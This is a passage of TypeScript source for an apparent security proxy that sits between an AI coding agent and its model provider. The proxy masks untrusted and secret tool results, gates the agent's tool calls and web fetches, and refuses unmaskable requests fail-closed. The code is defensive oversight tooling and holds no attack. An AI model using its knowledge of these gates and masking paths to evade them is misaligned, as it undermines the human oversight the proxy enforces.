   *  tool that produced it. Bounded; oldest first out. */
  private readonly openaiCalls = new Map<string, { name: string; input: Record<string, unknown> }>();
  private server?: Server;

  /** Per-process session id base, used when no session header is present. */
  private readonly fallbackSessionId: string;
  /** Per-session monotonic turn counter (one /v1/messages exchange = one turn). */
  private readonly turnBySession = new Map<string, number>();
  /** In-flight best-effort emits, awaited at close() so tests/shutdown are clean. */
  private readonly pendingEmits = new Set<Promise<void>>();
  /** Reply row reservation: the arbiter-backed eligibility (relay mode,
   *  kill switch, line counts) and the row cap. */
  private readonly reserve: ReserveEligibility;
  private readonly reserveCap: number;

  constructor(opts: ProxyOptions) {
    this.arbiter = opts.arbiter;
    this.upstreamOrigin = opts.upstreamOrigin ?? DEFAULT_UPSTREAM_ORIGIN;
    this.upstream = opts.upstream ?? this.makeHttpsFetcher(this.upstreamOrigin, opts.upstreamTls);
    this.sessionKey = opts.sessionKey;
    this.handlingMode = opts.handlingMode;
    if (opts.secretPosture) this.secretPosture = opts.secretPosture;
    this.netTlsInspected = opts.netTlsInspected === true;
    this.upstreamLocal = opts.upstreamLocal === true;
    this.log = opts.log ?? ((m) => console.error(`[anthropic-proxy] ${m}`));
    // Kept in the arbiter too, so a resumed conversation gets its note
    // (confidentiality.md §7.1, "Masked after the fact", across a resume).
    this.clearResults = new ClearResultLedger(undefined, { store: arbiterClearResultStore(this.arbiter), log: this.log });
    // OpenClaw's history redaction undone across a relaunch too
    // (confidentiality.md §6): the placeholder records go to the arbiter.
    this.forwardedResults = new ForwardedResultMemory(undefined, undefined, { store: arbiterPlaceholderStore(this.arbiter), log: this.log });
    this.maxBodyBytes = opts.maxBodyBytes ?? DEFAULT_MAX_BODY;
    this.retry = { ...DEFAULT_RETRY, ...(opts.retry ?? {}) };
    this.sleep = opts.sleep ?? ((ms) => new Promise((r) => setTimeout(r, ms)));
    this.viewMap = opts.viewMap?.active ? opts.viewMap : null;
    this.agentCwd = typeof opts.agentCwd === "string" && opts.agentCwd.startsWith("/") ? opts.agentCwd : undefined;
    this.execGateEnabled = opts.execGate ?? true;
    this.identity = opts.identity ?? null;
    this.openaiUpstreams = new Map(Object.entries(opts.openaiUpstreams ?? {}));
    this.openaiTextCalls = new Set(opts.openaiTextCalls ?? []);
    this.openaiFetcherFor = opts.openaiFetcher ?? ((provider) => this.makeHttpsFetcher(this.openaiUpstreams.get(provider)!));
    this.gateSurfaces = new GateSurfaceCache(this.arbiter, { log: (m) => this.log(m) });
    this.fallbackSessionId =
      opts.sessionKey ?? `mp_${Date.now().toString(36)}_${Math.floor(Math.random() * 1e6).toString(36)}`;
    this.reserve = new ReserveEligibility(this.arbiter, {
      enabled: opts.replyReserve?.enabled ?? true,
      ...(opts.sessionKey ? { sessionKey: opts.sessionKey } : {}),
      ...(opts.replyReserve?.timeoutMs !== undefined ? { timeoutMs: opts.replyReserve.timeoutMs } : {}),
      ...(opts.replyReserve?.relayTtlMs !== undefined ? { relayTtlMs: opts.replyReserve.relayTtlMs } : {}),
    });
    this.reserveCap = opts.replyReserve?.maxRows !== undefined
      ? parseReserveMax(String(opts.replyReserve.maxRows))
      : RESERVE_MAX_ROWS;
  }

  /** Build a Node request handler (exposed for in-process supertest-style tests). */
  handler(): (req: IncomingMessage, res: ServerResponse) => void {
    return (req, res) => {
      this.onRequest(req, res).catch((err) => {
        this.log(`unhandled error: ${(err as Error).message}`);
        if (!res.headersSent) {
          res.writeHead(500, { "content-type": "application/json" });
        }
        if (!res.writableEnded) {
          res.end(JSON.stringify({ error: { type: "proxy_error", message: "internal proxy error" } }));
        }
      });
    };
  }

  async listen(port: number, host = "127.0.0.1"): Promise<number> {
    this.server = createServer(this.handler());
    await new Promise<void>((resolve, reject) => {
      this.server!.once("error", reject);
      this.server!.listen(port, host, () => {
        this.server!.off("error", reject);
        resolve();
      });
    });
    const addr = this.server.address();
    const boundPort = typeof addr === "object" && addr ? addr.port : port;
    this.log(`listening on http://${host}:${boundPort} → ${this.upstreamOrigin}`);
    return boundPort;
  }

  async close(): Promise<void> {
    if (this.server) {
      await new Promise<void>((resolve) => this.server!.close(() => resolve()));
      this.server = undefined;
    }
    // Drain any best-effort emits so the process / test exits cleanly. These
    // are already swallowed (safeEmit), so this never rejects.
    await Promise.allSettled([...this.pendingEmits]);
  }

  // ── observability event emission (BEST-EFFORT, off the security path) ───────

  /**
   * Derive a stable session id for this exchange: prefer an explicit request
   * header (so a launcher / Claude Code can thread its scope id), else the
   * per-process fallback. Same id across turns of one connection/session.
   */
  /** Raw value of the first present session-id header (un-sanitized), or "". */
  private rawSessionHeader(headers: IncomingMessage["headers"]): string {
    for (const h of SESSION_ID_HEADERS) {
      const v = headers[h];
      const s = Array.isArray(v) ? v[0] : v;
      if (typeof s === "string" && s.trim() !== "") return s.trim();
    }
    return "";
  }

  private sessionIdFor(headers: IncomingMessage["headers"]): string {
    // Claude Code's ANTHROPIC_CUSTOM_HEADERS only delivers ONE header (claude-code
    // #1859), so a caller may PACK extra ids into the session-id value as
    // ";name: value" pairs (e.g. "<sid>;x-mandu-batch-id: <bid>"). The session id
    // is the part before the first ";"; a plain value (no ";") passes through.
    const raw = this.rawSessionHeader(headers);
    const sid = raw.split(";")[0]!.trim();
    return sid ? sanitizeSessionId(sid) : this.fallbackSessionId;
  }

  /** The session's tenant (policy-surface.md §2.7): the real
   *  `x-mandu-tenant` header, else the pair packed into the session-id header
   *  (the ANTHROPIC_CUSTOM_HEADERS single-header workaround), else this
   *  process's MANDU_TENANT. Anything but "live"/"test" is ignored — an
   *  unstamped event is the honest state; a guessed one is not. */
  private tenantFor(headers: IncomingMessage["headers"]): "live" | "test" | undefined {
    const ok = (v: string | undefined): "live" | "test" | undefined =>
      v === "live" || v === "test" ? v : undefined;
    for (const h of TENANT_HEADERS) {
      const v = headers[h];
      const s = Array.isArray(v) ? v[0] : v;
      if (typeof s === "string") return ok(s.trim());
    }
    for (const part of this.rawSessionHeader(headers).split(";").slice(1)) {
      const i = part.indexOf(":");
      if (i > 0 && part.slice(0, i).trim().toLowerCase() === "x-mandu-tenant") {
        return ok(part.slice(i + 1).trim());
      }
    }
    return ok(process.env["MANDU_TENANT"]);
  }

  /** Optional batch id so the dashboard sidebar can group sessions run together.
   *  Read from the real `x-mandu-batch-id` header (direct-HTTP callers), else
   *  unpacked from a ";x-mandu-batch-id: <id>" pair embedded in the session-id
   *  header value (the ANTHROPIC_CUSTOM_HEADERS single-header workaround). Sanitized
   *  like the session id (persisted on events). Undefined when absent. */
  private batchIdFor(headers: IncomingMessage["headers"]): string | undefined {
    for (const h of BATCH_ID_HEADERS) {
      const v = headers[h];
      const s = Array.isArray(v) ? v[0] : v;
      if (typeof s === "string" && s.trim() !== "") return sanitizeSessionId(s.trim());
    }
    for (const part of this.rawSessionHeader(headers).split(";").slice(1)) {
      const i = part.indexOf(":");
      if (i > 0 && part.slice(0, i).trim().toLowerCase() === "x-mandu-batch-id") {
        const b = part.slice(i + 1).trim();
        if (b) return sanitizeSessionId(b);
      }
    }
    return undefined;
  }

  /** Allocate the next monotonic turn index for a session (0-based). */
  private nextTurn(sessionId: string): number {
    const t = this.turnBySession.get(sessionId) ?? 0;
    this.turnBySession.set(sessionId, t + 1);
    return t;
  }

  /**
   * Fire an event at the arbiter, BEST-EFFORT. A failed or slow emit is swallowed
   * — it can never block or fail the request, and we never read anything back
   * toward T-LLM. Tracked in pendingEmits so close() can drain it cleanly.
   */
  /** Sessions whose `client_info` health event was emitted. */
  private readonly announced = new Set<string>();
  /** Sessions whose `tool_surface` health event was emitted — tracked apart
   *  from `announced` because the FIRST request of a Claude Code session is
   *  routinely a tool-less side call (the quota probe, title generation): one
   *  shared flag left 207 of 209 session logs on the host without any
   *  tool_surface at all (found 2026-09-18 while grading watch runs), so the
   *  §4.21 unknown-tools chip and any "does this build offer Grep?" question
   *  had nothing to read. The surface is emitted on the first request that
   *  carries a tool battery, whenever that is. */
  private readonly surfaceAnnounced = new Set<string>();

  /** Emit the session-health `client_info` (first request) and `tool_surface`
   *  (first request carrying tools) events ONCE per session (dashboard.md
   *  §4.21). The user-agent names the Claude Code release (`claude-cli/<ver>
   *  …`); the tool names go to the arbiter, which answers what its inbound
   *  spec does not know — a new release adding a tool is exactly the drift
   *  this surfaces. Best-effort, off the security path: every failure is
   *  swallowed. */
  private async announceSession(
    ctx: EventContext,
    headers: IncomingMessage["headers"],
    tools: unknown,
    model: string | null,
  ): Promise<void> {
    try {
      if (!this.announced.has(ctx.sessionId)) {
        this.announced.add(ctx.sessionId);
        const ua = headers["user-agent"];
        const userAgent = Array.isArray(ua) ? (ua[0] ?? "") : (ua ?? "");
        const ver = /claude-cli\/([0-9][^\s]*)/.exec(userAgent);
        this.safeEmit(makeClientInfo(ctx, { userAgent, clientVersion: ver ? ver[1]! : null, model }));
      }
      if (this.surfaceAnnounced.has(ctx.sessionId)) return;
      const names = Array.isArray(tools)
        ? (tools as Array<{ name?: unknown }>).map((t) => t?.name).filter((n): n is string => typeof n === "string")
        : [];
      if (names.length === 0) return;
      this.surfaceAnnounced.add(ctx.sessionId);
      const { unknown } = await this.arbiter.toolSurface(names, ctx.sessionId);
      if (unknown.length > 0) {
        this.log(`session ${ctx.sessionId}: ${unknown.length} advertised tool(s) unknown to the inbound spec (outputs fail closed): ${unknown.join(", ")}`);
      }
      this.safeEmit(makeToolSurface(ctx, { names, unknown }));
    } catch {
      /* observability only */
    }
  }

  private safeEmit(event: ArbiterEvent): void {
    const p = (async () => {
      try {
        await this.arbiter.emit(event);
      } catch (err) {
        this.log(`emit failed (non-fatal, off security path): ${(err as Error).message}`);
      }
    })().finally(() => {
      this.pendingEmits.delete(p);
    });
    this.pendingEmits.add(p);
  }

  // ── request handling ──────────────────────────────────────────────────────

  private async onRequest(req: IncomingMessage, res: ServerResponse): Promise<void> {
    const method = req.method ?? "GET";
    const path = req.url ?? "/";

    // Local admin: the launcher's start-or-reuse identity probe. Answered here
    // (never forwarded upstream) so a listening proxy can be checked as THIS
    // session's before it is adopted. GET only; no body.
    if (method === "GET" && (path.split("?")[0] ?? "") === IDENTITY_PATH) {
      this.serveIdentity(res);
      return;
    }

    const body = await this.readBody(req, res);
    if (body == null) return; // readBody already responded (e.g. 413)

    // An OpenAI-family provider routed through this proxy (route.ts
    // classifyOpenAiRoute; agent-e2e-harness.md §9): the same gates, read
    // off the other wire.
    const oa = classifyOpenAiRoute(method, path, body.length, new Set(this.openaiUpstreams.keys()));
    if (oa !== null) {
      await this.onOpenAiRequest(req, res, method, body, oa);
      return;
    }

    // Which requests may go upstream (src/route.ts, fail-closed): the Messages
    // wire and count_tokens are rewritten below, a bodyless GET/HEAD is relayed
    // as is, and everything else is refused here and never sent, since another
    // generation wire would reach the model with its tool results unmasked.
    const route = classifyRoute(method, path, body.length);
    if (route.kind === "relay") {
      await this.forwardAndStream(method, path, req.headers, body, res, /*sniff*/ false);
      return;
    }
    if (route.kind === "refuse") {
      this.log(`FAIL-CLOSED refusing ${method} ${path.split("?")[0]}: not a route the proxy can mask`);
      this.refuse(res, 403, route.message!);
      return;
    }
    const countOnly = route.kind === "count_tokens";

    // ── Parse the request body. ──
    let parsed: MessagesRequest;
    try {
      parsed = JSON.parse(body.toString("utf8")) as MessagesRequest;
    } catch (err) {
      // A POST /v1/messages with an unparseable body: we cannot inspect it for
      // untrusted content, so we FAIL CLOSED rather than forward blindly.
      this.refuse(res, 400, `unparseable Messages request body: ${(err as Error).message}`);
      return;
    }

    // A cloud-backed model at a declared LOCAL upstream (plan 11 §8 item 3):
    // the local server would relay the conversation to its vendor, so refuse
    // before any arbiter call and send nothing. 400 (not the fail-closed 502):
    // the request itself is what cannot go, and Claude Code retries a 5xx but
    // shows a 400's message to the user once.
    if (this.upstreamLocal && typeof parsed.model === "string" && isCloudBackedModel(parsed.model)) {
      this.log(`refusing ${method} ${path.split("?")[0]}: model ${parsed.model} is cloud-backed and the upstream is a declared local model`);
      this.refuseRequest(
        res, 400,
        `mandu: refusing model ${parsed.model}: it runs on the vendor's servers (a cloud model), and your main model is declared ` +
          "local: true in policy.yaml models:, so nothing was sent. Choose a model that runs on this machine " +
          "(claude --model <name>, or ANTHROPIC_MODEL), then try again.",
      );
      return;
    }

    // Reply row reservation, request side (reply-row-reservation.md §3.4):
    // collapse each reserve block in the assistant's own text back to its
    // token, then strip every leftover fragment from every text the model
    // reads. ALWAYS on (whatever the expansion switch says), and BEFORE
    // rewriteRequest, so the trusted-context haystack and every later step
    // read the bytes actually forwarded. Never throws.
    const reservePass = this.reservePass(parsed);

    // The session agent's gate surface: keyed on the SAME session identity
    // classify resolves its trust spec with (this.sessionKey; absent ⇒ the
    // arbiter's global spec), so the gates and the trust spec always name the
    // same agent. Never throws (the union of every agent's table on any failure).
    const surface = await this.gateSurfaces.get(this.sessionKey);

    // ── Security-critical rewrite (fail-closed). ──
    let rewritten;
    try {
      rewritten = await rewriteRequest(parsed, {
        ...this.rewriteOptions(surface),
        // count_tokens: the same masking, without the handling prompt. Claude
        // Code counts its context one category at a time (/context), and the
        // proxy's prompt in every count would inflate each one.
        ...(countOnly ? { skipPromptInjection: true, promptCountOnly: true } : {}),
        signal: clientGone(res),
      });
    } catch (err) {
      if (err instanceof RewriteAbandoned) {
        // Plan 15 §13.6 item 13: the agent went away while its prompt was
        // held. Nothing was sent, and nobody is there to read a refusal.
        this.log(`prompt filter: ${err.message}`);
        return;
      }
      if (err instanceof RewriteBlocked) {
        // Plan 15 §7: the prompt filter's policy blocks this prompt. A 400 in
        // the Messages error shape, which Claude Code prints ("API Error:
        // 400 …") without retrying; the reason names categories, never a value.
        this.log(`prompt filter BLOCKED the request: ${err.message}`);
        this.emitBlockedPrompt(req, err.report);
        this.refuseRequest(res, 400, err.message);
        return;
      }
      if (err instanceof RewriteRefusal) {
        this.log(`FAIL-CLOSED refusing request: ${err.message}`);
        this.refuse(res, 502, err.message);
        return;
      }
      throw err;
    }

    const rewroteAny = rewritten.rewrites.some((r) => r.symbolized);
    this.log(
      `POST ${path}: ${rewritten.rewrites.length} tool_result(s), ${rewritten.rewrites.filter((r) => r.symbolized).length} symbolized${rewroteAny ? "" : ""}`,
    );

    // fs prefix map, request side (P2): reverse-map AgentView paths back to
    // HumanView in tool_result content + echoed tool_use args. AFTER
    // symbolization (untrusted content is already an opaque symbol; the symbol
    // table keeps the true original) and BEFORE serialization + the ingress
    // events, so the §9 oracle checks the bytes actually forwarded.
    const reverseRewrites = this.viewMap
      ? reverseMapRequestPaths(rewritten.request, this.viewMap, surface)
      : [];

    // Net-gate history (confidentiality.md §4): a blocked WebFetch was rewritten
    // to the deny sentinel on its way to the client; put the model's OWN input
    // back so T-LLM does not read, and then repeat, a call it never made.
    const restoredNet = this.netGateHistory.restore(rewritten.request);
    if (restoredNet.length) this.log(`net-gate: restored the model's own input on ${restoredNet.length} blocked call(s) in history`);

    const outBody = Buffer.from(JSON.stringify(rewritten.request), "utf8");
    const outBodyText = outBody.toString("utf8");

    // count_tokens: the provider counts the MASKED request (symbols in place of
    // untrusted and secret content). No turn, no events, no tool_use to read back.
    if (countOnly) {
      if (reservePass.removed > 0) {
        const sid = this.sessionIdFor(req.headers);
        this.safeEmit(makeReserveResidual(
          { sessionId: sid, turn: this.turnBySession.get(sid) ?? 0, batchId: this.batchIdFor(req.headers), tenant: this.tenantFor(req.headers) },
          { removed: reservePass.removed, where: reservePass.where, route: "count_tokens" },
        ));
      }
      await this.forwardAndStream(method, path, req.headers, outBody, res, /*sniff*/ false);
      return;
    }

    // ── Observability events (BEST-EFFORT, off the security path). ──
    // Derive the per-exchange context, then emit symbolize + tool_result events
    // for what the rewrite did, and prepare a tllm_call (emitted once the
    // response's tool_use names are known). Every emit is swallowed.
    const sessionId = this.sessionIdFor(req.headers);
    const ctx: EventContext = {
      sessionId,
      turn: this.nextTurn(sessionId),
      batchId: this.batchIdFor(req.headers),
      tenant: this.tenantFor(req.headers),
    };
    // Session-health, once per session: which client this is, and whether
    // its tool battery is fully known to the inbound spec (best-effort).
    void this.announceSession(ctx, req.headers, parsed.tools, typeof parsed.model === "string" ? parsed.model : null);
    // Record each reverse ViewMap application (AgentView→HumanView spelling on
    // the request wire) so the dashboard can show when/how the P2 path rewrite
    // ran. The stateless Messages API re-sends history, so the same echoed block
    // re-reports every turn — the dashboard view-model collapses repeats.
    for (const c of reverseRewrites) {
      this.safeEmit(
        makePathRewrite({
          ctx, callId: c.callId, tool: c.tool, field: c.field,
          direction: "reverse", human: c.human, agent: c.agent,
        }),
      );
    }
    this.emitIngressEvents(ctx, rewritten);
    if (reservePass.removed > 0) {
      this.safeEmit(makeReserveResidual(ctx, { removed: reservePass.removed, where: reservePass.where, route: "messages" }));
    }

    await this.forwardAndStream(
      method, path, req.headers, outBody, res, /*sniff*/ true, parsed.stream,
      { ctx, rewritten, forwardedText: outBodyText, model: rewritten.request.model },
    );
  }

  /** The reserve-block collapse + residual strip over a parsed Messages
   *  body (reserve-request.ts). Never throws. The pass is pure string work
   *  over type-checked fields and has no failure path of its own; this
   *  catch is defense in depth (whatever it changed before a throw was a
   *  removal). */
  private reservePass(parsed: MessagesRequest): ReserveRequestPass {
    try {
      const r = reserveRequestPass(parsed);
      if (r.collapsed > 0 || r.removed > 0) {
        this.log(`reply reserve: collapsed ${r.collapsed} block(s), stripped ${r.removed} residual fragment(s)`);
      }
      return r;
    } catch (err) {
      this.log(`reply reserve pass error (non-fatal): ${(err as Error).message}`);
      return { collapsed: 0, removed: 0, where: [] };
    }
  }

  /** The request-rewrite options every wire shares (rewrite-request.ts). */
  private rewriteOptions(surface: GateSurface): Parameters<typeof rewriteRequest>[1] {
    return {
      arbiter: this.arbiter,
      promptBlockLedger: this.promptBlocks,
      execGateNotices: this.execGateNotices,
      resultNotices: this.resultNotices,
      clearResults: this.clearResults,
      forwardedResults: this.forwardedResults,
      // non-fatal notices (a result put back from OpenClaw's redaction)
      log: (m: string) => this.log(m),
      sessionKey: this.sessionKey,
      surface,
      // The base the agent resolves a relative typed path against, as the
      // gates use it (only for a `relativeBase: "launch"` surface and a
      // launcher-named directory): classify reads the path there too, so the
      // human's label on the file decides it (confidentiality.md §6).
      ...this.relativeBaseFor(surface),
      handlingMode: this.handlingMode,
      // The session's secret posture rides every handling-prompt request
      // (a `read-blocked` session is told its credential files cannot be read).
      ...(this.secretPosture ? { secretPosture: this.secretPosture } : {}),
      // The origin the arbiter derives the LEVEL from must be spelled in the
      // arbiter's world (HumanView, Plan 9). The agent echoes the AgentView
      // twin it executed, and the label stores are HumanView-keyed — so
      // without this a labeled file classifies `public` under fs-sync, which
      // is the DEFAULT posture for a git workspace. Trust is untouched: the
      // arbiter reads `originHuman` only in the confidentiality derivation.
      ...(this.viewMap
        ? {
            toHumanView: (o: string) => this.viewMap!.mapText(o, "reverse"),
            // The symbol-twin note (symbol-twin-shell-blindness.md §4.1)
            // resolves the model's command paths against these roots.
            agentViewRoots: this.viewMap.roots().map((p) => p.agent),
            twinHintCache: this.twinHintCache,
            log: (m: string) => this.log(m),
          }
        : {}),
    };
  }

  // ── OpenAI-family wires (agent-e2e-harness.md §9; openai-wire.ts) ────────

  private openaiFetcher(provider: string): UpstreamFetcher {
    let f = this.openaiFetchers.get(provider);
    if (!f) {
      f = this.openaiFetcherFor(provider);
      this.openaiFetchers.set(provider, f);
    }
    return f;
  }

  private rememberOpenAiCall(c: ReleasedCall): void {
    if (!c.id || c.input === null || typeof c.input !== "object" || Array.isArray(c.input)) return;
    this.openaiCalls.delete(c.id);
    this.openaiCalls.set(c.id, { name: c.name, input: c.input as Record<string, unknown> });
    if (this.openaiCalls.size > 4096) {
      const oldest = this.openaiCalls.keys().next().value;
      if (oldest !== undefined) this.openaiCalls.delete(oldest);
    }
  }

  /** An OpenAI-shaped error (`{"error":{"message","type"}}`), the shape both
   *  agents' OpenAI transports print. */
  private refuseOpenAi(res: ServerResponse, status: number, message: string): void {
    if (res.headersSent) return;
    res.writeHead(status, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: { type: status === 400 ? "invalid_request_error" : "mandu_fail_closed", message } }));
  }

  /**
   * One request to a routed OpenAI-family provider: read it as the Messages
   * request the gates know (openai-wire.ts), run the SAME request rewrite,
   * write the result back onto the agent's own body, send it to the
   * provider, and gate the tool calls in the answer (openai-sse.ts). Every
   * failure before the send answers without sending: 400 for a request that
   * cannot be read or must not go, 502 when the arbiter fails.
   */
  private async onOpenAiRequest(req: IncomingMessage, res: ServerResponse, method: string, body: Buffer, route: OpenAiRoute): Promise<void> {
    if (route.kind === "refuse") {
      this.log(`FAIL-CLOSED refusing ${method} ${OPENAI_LOG_PREFIX}${route.provider}${route.rest.split("?")[0]}: not a route the proxy can mask`);
      this.refuseOpenAi(res, 403, route.message!);
      return;
    }
    const fetcher = this.openaiFetcher(route.provider);
    if (route.kind === "relay") {
      await this.forwardOpenAi(fetcher, method, route.rest, req.headers, body, res, null, this.openaiUpstreams.get(route.provider));
      return;
    }
    const api: OpenAiApi = route.kind;
    let parsed: Record<string, unknown>;
    try {
      const v: unknown = JSON.parse(body.toString("utf8"));
      if (v === null || typeof v !== "object" || Array.isArray(v)) throw new Error("not a JSON object");
      parsed = v as Record<string, unknown>;
    } catch (err) {
      this.refuseOpenAi(res, 400, `mandu: unparseable ${api === "chat" ? "Chat Completions" : "Responses"} request body (${(err as Error).message}); nothing was sent`);
      return;
    }
    const refusal = providerSideRefusal(api, parsed);
    if (refusal !== null) {
      this.log(`refusing a request to provider ${route.provider}: ${refusal}`);
      this.refuseOpenAi(res, 400, `mandu: refusing this request to provider "${route.provider}": ${refusal}. Nothing was sent.`);
      return;
    }
    let shadow;
    try {
      shadow = shadowFor(api, parsed, { get: (id) => this.openaiCalls.get(id) } satisfies CallMemory);
    } catch (err) {
      if (err instanceof OpenAiWireError) {
        this.log(`FAIL-CLOSED refusing a request to provider ${route.provider}: ${err.message}`);
        this.refuseOpenAi(res, 400, `mandu: refusing this request to provider "${route.provider}": ${err.message}. Nothing was sent.`);
        return;
      }
      throw err;
    }
    const surface = await this.gateSurfaces.get(this.sessionKey);
    let rewritten: RewriteResult;
    try {
      rewritten = await rewriteRequest(shadow.shadow, { ...this.rewriteOptions(surface), signal: clientGone(res) });
    } catch (err) {
      if (err instanceof RewriteAbandoned) {
        this.log(`prompt filter: ${err.message} (provider ${route.provider})`);
        return;
      }
      if (err instanceof RewriteBlocked) {
        this.log(`prompt filter BLOCKED a request to provider ${route.provider}: ${err.message}`);
        this.emitBlockedPrompt(req, err.report);
        this.refuseOpenAi(res, 400, err.message);
        return;
      }
      if (err instanceof RewriteRefusal) {
        this.log(`FAIL-CLOSED refusing request: ${err.message}`);
        this.refuseOpenAi(res, 502, err.message);
        return;
      }
      throw err;
    }
    const reverseRewrites = this.viewMap ? reverseMapRequestPaths(rewritten.request, this.viewMap, surface) : [];
    const restoredNet = this.netGateHistory.restore(rewritten.request);
    if (restoredNet.length) this.log(`net-gate: restored the model's own input on ${restoredNet.length} blocked call(s) in history`);
    let outBody: Buffer;
    try {
      outBody = Buffer.from(JSON.stringify(shadow.apply(rewritten.request)), "utf8");
    } catch (err) {
      this.log(`FAIL-CLOSED: could not write the masked request back (${(err as Error).message})`);
      this.refuseOpenAi(res, 502, "mandu: could not write the masked request back; nothing was sent");
      return;
    }
    this.log(`POST ${OPENAI_LOG_PREFIX}${route.provider}${route.rest.split("?")[0]}: ${rewritten.rewrites.length} tool result(s), ${rewritten.rewrites.filter((r) => r.symbolized).length} symbolized`);

    const sessionId = this.sessionIdFor(req.headers);
    const ctx: EventContext = {
      sessionId,
      turn: this.nextTurn(sessionId),
      batchId: this.batchIdFor(req.headers),
      tenant: this.tenantFor(req.headers),
    };
    const model = typeof parsed["model"] === "string" ? (parsed["model"] as string) : "";
    void this.announceSession(ctx, req.headers, shadow.shadow.tools, model || null);
    for (const c of reverseRewrites) {
      this.safeEmit(makePathRewrite({ ctx, callId: c.callId, tool: c.tool, field: c.field, direction: "reverse", human: c.human, agent: c.agent }));
    }
    this.emitIngressEvents(ctx, rewritten);
    await this.forwardOpenAi(fetcher, method, route.rest, req.headers, outBody, res, {
      api,
      textCalls: this.openaiTextCalls.has(route.provider),
      stream: parsed["stream"] === true,
      emit: { ctx, rewritten, forwardedText: outBody.toString("utf8"), model },
    }, this.openaiUpstreams.get(route.provider));
  }

  /**
   * Send to the routed provider and relay its answer. `gated` null: a relay
   * (bodyless read), bytes as they come. Otherwise every tool call in the
   * answer is gated before the agent sees it: a stream through the wire's
   * rewriter, a buffered body parsed and rewritten whole (an answer that
   * cannot be read is a 502, never relayed).
   */
  private async forwardOpenAi(
    fetcher: UpstreamFetcher,
    method: string,
    rest: string,
    headers: IncomingMessage["headers"],
    body: Buffer,
    res: ServerResponse,
    gated: { api: OpenAiApi; stream: boolean; emit: EmitState; textCalls?: boolean } | null,
    upstreamBase?: string,
  ): Promise<void> {
    const sessionId = this.sessionIdFor(headers);
    // sanitizeHeaders keeps Mandu's own x-mandu-* headers home.
    const fwdHeaders = this.sanitizeHeaders(headers, body.length);
    // The agent's own key, put back in the auth header for this provider's
    // host only (agent-sign-in.md §3).
    await this.restoreAgentKey(fwdHeaders, upstreamBase);
    let upstream: UpstreamResponse;
    try {
      upstream = await this.upstreamWithRetry({ method, path: rest, headers: fwdHeaders, body }, fetcher);
    } catch (err) {
      this.log(`upstream error: ${(err as Error).message}`);
      this.refuseOpenAi(res, 502, `upstream request failed: ${(err as Error).message}`);
      return;
    }
    if (gated === null) {
      res.writeHead(upstream.status, this.responseHeaders(upstream.headers));
      upstream.body.pipe(res);
      await this.finished(res);
      return;
    }
    const emit = gated.emit;
    const seen: ReconstructedToolUse[] = [];
    const texts: string[] = [];
    const recorded: Array<Promise<void>> = [];
    const transform = this.toolInputTransform(sessionId, emit);
    const gate: CallGate = async (name, input, id) => (transform ? transform(name, input, id) : null);
    const opts = {
      onCall: (c: ReleasedCall): void => {
        seen.push({ id: c.id, name: c.name, input: c.input });
        recorded.push(this.recordToolUse(c.id, c.name, c.input));
        this.rememberOpenAiCall(c);
        this.safeEmit(makeToolUse({ ctx: emit.ctx, callId: c.id, name: c.name, input: c.input }));
      },
      onText: (t: string): void => { texts.push(t); },
      log: (m: string): void => this.log(m),
      ...(gated.textCalls ? { refuseTextCalls: true } : {}),
    };
    const ctype = headerValue(upstream.headers, "content-type") ?? "";
    const isSse = upstream.status < 400 && (ctype.includes("text/event-stream") || gated.stream);

    if (!isSse) {
      const chunks: Buffer[] = [];
      await new Promise<void>((resolve) => {
        upstream.body.on("data", (c: Buffer) => chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c)));
        upstream.body.on("end", resolve);
        upstream.body.on("error", () => resolve());
      });
      let buf = Buffer.concat(chunks);
      if (upstream.status < 400) {
        // A 2xx answer carries the model's calls: it goes out only as read.
        try {
          const v: unknown = JSON.parse(buf.toString("utf8"));
          if (v === null || typeof v !== "object" || Array.isArray(v)) throw new Error("not a JSON object");
          const obj = v as Record<string, unknown>;
          let changed = gated.api === "chat" ? await gateChatJson(obj, gate, opts) : await gateResponsesJson(obj, gate, opts);
          // The reply-media gate over the answer's text (reply-media.ts).
          const mediaOpts = await this.replyMediaFor(sessionId, emit);
          if (mediaOpts && (gated.api === "chat" ? await gateChatJsonReply(obj, mediaOpts) : await gateResponsesJsonReply(obj, mediaOpts))) changed = true;
          if (changed) buf = Buffer.from(JSON.stringify(obj), "utf8");
        } catch (err) {
          this.log(`FAIL-CLOSED: the provider's answer could not be read (${(err as Error).message})`);
          this.emitTllmCall(emit, seen, texts.join(""), { status: 502, error: "the provider's answer could not be read" });
          this.refuseOpenAi(res, 502, `mandu: the model provider's answer could not be read (${(err as Error).message}); it was not relayed`);
          return;
        }
      }
      this.emitTllmCall(emit, seen, texts.join(""), { status: upstream.status });
      res.writeHead(upstream.status, this.responseHeaders(upstream.headers, { dropContentLength: true }));
      res.end(buf);
      await Promise.allSettled(recorded);
      return;
    }

    res.writeHead(upstream.status, this.responseHeaders(upstream.headers, { dropContentLength: true }));
    const rw = gated.api === "chat" ? new ChatStreamRewriter(gate, opts) : new ResponsesStreamRewriter(gate, opts);
    // The text-delta token repacker, the OpenAI twin of the Messages one
    // (text-repack.ts): a `$MDU:` token split across two text deltas
    // reaches the agent whole in one. After the gate, pure string work.
    const repack = gated.api === "chat" ? new ChatTextRepacker() : new ResponsesTextRepacker();
    // The reply-media gate (reply-media.ts), after the repacker. Resolved
    // inside the relay chain (its first link awaits it), so the stream's
    // listeners are attached at once and no upstream error goes unheard.
    let media: ReplyMediaFilter | null = null;
    const mediaReady = this.replyMediaFor(sessionId, emit).then((o) => {
      media = o ? new ReplyMediaFilter(gated.api === "chat" ? CHAT_WIRE : RESPONSES_WIRE, o) : null;
    });
    const src = upstream.body;
    src.setEncoding("utf8");
    let broken = false;
    let chain: Promise<void> = Promise.resolve();
    const enqueue = (fn: () => Promise<void>): void => { chain = chain.then(fn, fn); };
    const step = async (fn: () => Promise<string>): Promise<void> => {
      if (broken) return;
      try {
        const out = await fn();
        if (out !== "") res.write(out);
      } catch (err) {
        // A rewriter fault ends the relay: nothing ungated goes out after it.
        broken = true;
        this.log(`FAIL-CLOSED: the response rewriter failed (${(err as Error).message}); ending the stream`);
      }
    };
    src.on("data", (chunk: string) => enqueue(() => step(async () => {
      await mediaReady;
      const out = repack.feed(await rw.feed(chunk));
      return media ? media.feed(out) : out;
    })));
    await new Promise<void>((resolve) => {
      const finish = (): void => enqueue(async () => {
        await step(async () => {
          await mediaReady;
          const tail = repack.feed(await rw.end()) + repack.end();
          const m = media as ReplyMediaFilter | null;
          return m ? m.feed(tail) + (await m.end()) : tail;
        });
